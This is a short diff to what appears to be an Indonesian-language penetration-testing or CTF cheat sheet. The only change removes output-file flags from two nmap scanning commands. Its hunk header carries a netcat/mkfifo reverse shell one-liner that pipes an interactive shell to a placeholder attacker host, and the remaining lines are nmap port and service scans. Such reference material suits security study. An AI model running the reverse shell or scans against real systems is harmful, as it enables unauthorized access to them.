@@ -1758,13 +1758,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
 ## Q1 — Scan seluruh port?
 
 ```bash
-nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
+nmap -p- --min-rate 5000 -T4 "$TARGET"
 ```
 
 ## Q2 — Scan detail service?
 
 ```bash
-nmap -sC -sV -p<PORTS> "$TARGET" -oN service-scan.txt
+nmap -sC -sV -p<PORTS> "$TARGET"
 ```
 
 ## Q3 — Directory enumeration?
